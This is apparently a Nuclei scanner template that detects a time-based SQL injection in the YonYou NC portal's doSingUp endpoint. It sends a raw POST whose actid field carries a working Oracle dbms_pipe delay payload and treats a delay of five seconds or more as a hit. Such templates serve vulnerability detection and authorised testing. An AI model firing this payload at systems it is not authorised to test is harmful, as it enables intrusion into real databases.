id: YonYouNC-doSingUp-sqlInjection

info:
  name: YonYouNC-doSingUp-sqlInjection
  author: iSee857
  severity: high
  description: YonYouNC-doSingUp-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /portal/pt/ActivityNotice/doSingUp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
      
        pageId=login&pk_psndoc=1&actid=1' AND 1=dbms_pipe.receive_message('RDS', 5)--

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 500
          - 200
        condition: or